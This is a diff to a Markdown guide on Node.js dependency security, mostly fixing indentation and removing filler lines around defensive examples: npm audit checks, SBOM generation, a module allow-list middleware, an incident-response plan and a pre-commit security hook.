-// Basic example showing the core idea.
 ```javascript
 // Security monitoring script
 const { execSync } = require('child_process');
@@ -2050,23 +2006,23 @@ async function securityCheck() {
     const auditResult = execSync('npm audit --json', { encoding: 'utf8' });
     const audit = JSON.parse(auditResult);
 
-// Check for high/critical vulnerabilities
+    // Check for high/critical vulnerabilities
     const criticalVulns = audit.vulnerabilities.filter(
       (v) => v.severity === 'high' || v.severity === 'critical'
     );
 
-if (criticalVulns.length > 0) {
+    if (criticalVulns.length > 0) {
       await alertSecurityTeam(criticalVulns);
       process.exit(1);
     }
 
-// Check for outdated packages
+    // Check for outdated packages
     const outdatedResult = execSync('npm outdated --json', {
       encoding: 'utf8',
     });
     const outdated = JSON.parse(outdatedResult);
 
-// Generate security report
+    // Generate security report
     generateSecurityReport({
       vulnerabilities: audit.vulnerabilities,
       outdatedPackages: outdated,
@@ -2081,14 +2037,13 @@ if (criticalVulns.length > 0) {
 
 **SBOM (Software Bill of Materials) Generation:**
 
-// Basic example showing the core idea.
 ```javascript
 // Generate SBOM for compliance and tracking
 function generateSBOM() {
   const packageJson = require('./package.json');
   const packageLock = require('./package-lock.json');
 
-const sbom = {
+  const sbom = {
     bomFormat: 'CycloneDX',
     specVersion: '1.4',
     version: 1,
@@ -2104,7 +2059,7 @@ const sbom = {
     components: [],
   };
 
-// Add all dependencies to SBOM
+  // Add all dependencies to SBOM
   Object.entries(packageLock.packages).forEach(([path, pkg]) => {
     if (path !== '' && pkg.version) {
       sbom.components.push({
@@ -2117,13 +2072,12 @@ const sbom = {
     }
   });
 
-return sbom;
+  return sbom;
 }
 ```
 
 **Runtime Security Monitoring:**
 
-// Basic example showing the core idea.
 ```javascript
 // Runtime Application Self-Protection (RASP)
 const securityMiddleware = (req, res, next) => {
@@ -2133,21 +2087,20 @@ const securityMiddleware = (req, res, next) => {
     // Log and analyze module loading
     console.log(`Loading module: ${moduleName}`);
 
-// Check against whitelist
+    // Check against whitelist
     if (!isWhitelistedModule(moduleName)) {
       throw new Error(`Unauthorized module access: ${moduleName}`);
     }
 
-return originalRequire.apply(this, arguments);
+    return originalRequire.apply(this, arguments);
   };
 
-next();
+  next();
 };
 ```
 
 **Incident Response Plan:**
 
-// Basic example showing the core idea.
 ```javascript
 // Automated response to critical vulnerabilities
 async function handleCriticalVulnerability(vulnerability) {
@@ -2158,14 +2111,14 @@ async function handleCriticalVulnerability(vulnerability) {
       'Document impact assessment',
     ],
 
-shortTerm: [
+    shortTerm: [
       'Apply security patches',
       'Update dependencies',
       'Run comprehensive tests',
       'Deploy emergency fix',
     ],
 
-longTerm: [
+    longTerm: [
       'Review dependency policies',
       'Improve monitoring',
       'Update security procedures',
@@ -2173,20 +2126,19 @@ longTerm: [
     ],
   };
 
-// Execute immediate response
+  // Execute immediate response
   await Promise.all([
     alertSecurityTeam(vulnerability),
     blockAffectedEndpoints(vulnerability),
     logSecurityIncident(vulnerability),
   ]);
 
-return response;
+  return response;
 }
 ```
 
 **Policy Enforcement:**
 
-// Basic example showing the core idea.
 ```javascript
 // Pre-commit hooks for dependency security
 // .husky/pre-commit
@@ -2195,14 +2147,14 @@ return response;
 
 echo "Running security checks..."
 
-## Check for vulnerabilities
+# Check for vulnerabilities
 npm audit --audit-level moderate
 if [ $? -ne 0 ]; then
     echo "❌ Security vulnerabilities found. Commit blocked."
     exit 1
 fi
 
-## Check for unauthorized dependencies
+# Check for unauthorized dependencies
 node scripts/check-dependencies.js
 if [ $? -ne 0 ]; then
     echo "❌ Unauthorized dependencies found. Commit blocked."
@@ -2212,15 +2164,8 @@ fi
 echo "✅ Security checks passed."
 ```
 
+---
+
 🎯 These security measures work together to create a comprehensive defense
 against common web vulnerabilities. Always implement multiple layers of security
 rather than relying on a single protection mechanism! 🛡️✨
-
-## Quick Reference
-
-| Area | Revision point |
-|---|---|
-| Definition | State exactly what the topic means. |
-| Mechanism | Explain the steps that produce the result. |
-| Example | Use a small realistic case. |
-| Pitfalls | Know common mistakes and boundary cases. |
